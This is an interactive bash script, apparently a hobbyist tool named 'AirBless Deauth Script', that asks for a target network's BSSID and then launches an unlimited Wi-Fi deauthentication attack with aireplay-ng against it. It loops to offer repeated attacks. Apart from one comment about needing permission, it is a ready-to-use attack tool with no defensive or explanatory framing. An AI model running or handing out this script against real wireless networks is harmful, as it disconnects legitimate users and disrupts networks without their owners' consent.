#!/bin/bash

# Script to run aireplay-ng with user-provided BSSID
# Make sure you have permission to monitor the target network

# Colors for better UI
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
NC='\033[0m' # No Color

# Function to display header
display_header() {
    clear
    echo -e "${BLUE}================================================${NC}"
    echo -e "${CYAN}            AirBless Deauth Script              ${NC}"
    echo -e "${YELLOW}               By MrPirateXD                  ${NC}"
    echo -e "${BLUE}================================================${NC}"
    echo -e ""
}

# Function to display error message
display_error() {
    echo -e "${RED}Error: $1${NC}"
    echo -e "${YELLOW}$2${NC}"
    echo -e ""
}

# Function to validate BSSID format
validate_bssid() {
    local bssid=$1
    if [[ $bssid =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        return 0
    else
        return 1
    fi
}

# Initial screen clear and header
display_header

# Check if running as root
if [ "$EUID" -ne 0 ]; then 
    display_error "This script must be run as root (use sudo)" "Please run: sudo $0"
    exit 1
fi

# Main loop for user interaction
while true; do
    display_header
    
    # Prompt user for BSSID
    echo -e "${GREEN}Enter the target BSSID (format: AA:BB:CC:DD:EE:FF): ${NC}"
    echo -e "${CYAN}Or type 'exit' to quit${NC}"
    read -r bssid
    
    # Check if user wants to exit
    if [[ "${bssid,,}" == "exit" ]] || [[ "${bssid,,}" == "quit" ]]; then
        clear
        echo -e "${CYAN}Exiting AirBless Deauth Script. Goodbye!${NC}"
        exit 0
    fi
    
    # Validate BSSID format
    if ! validate_bssid "$bssid"; then
        clear
        display_header
        display_error "Invalid BSSID format" "Expected format: AA:BB:CC:DD:EE:FF (e.g., 00:11:22:33:44:55)"
        echo -e "${YELLOW}Press Enter to try again...${NC}"
        read -r
        continue
    fi
    
    # Clear screen and display attack information
    clear
    display_header
    
    echo -e "${GREEN}✓ BSSID validated successfully${NC}"
    echo ""
    echo -e "${CYAN}Starting aireplay-ng with the following parameters:${NC}"
    echo -e "  ${YELLOW}BSSID:${NC}                    $bssid"
    echo -e "  ${YELLOW}Attack Type:${NC}              Deauth"
    echo -e "  ${YELLOW}Attack Length:${NC}            Uncountable"
    echo -e "  ${YELLOW}Interface:${NC}                wlp2s0mon"
    echo ""
    echo -e "${RED}Press Ctrl+C to stop deauth attack${NC}"
    echo ""
    
    # Run the command
    sudo aireplay-ng --deauth 0 -a "$bssid" wlp2s0mon
    
    # After attack stops (Ctrl+C), ask if user wants to continue
    echo ""
    echo -e "${YELLOW}Attack stopped.${NC}"
    echo -e "${GREEN}Do you want to run another attack? (y/n): ${NC}"
    read -r choice
    
    if [[ "${choice,,}" != "y" ]] && [[ "${choice,,}" != "yes" ]]; then
        clear
        echo -e "${CYAN}Exiting AirBless Deauth Script. Goodbye!${NC}"
        exit 0
    fi
done
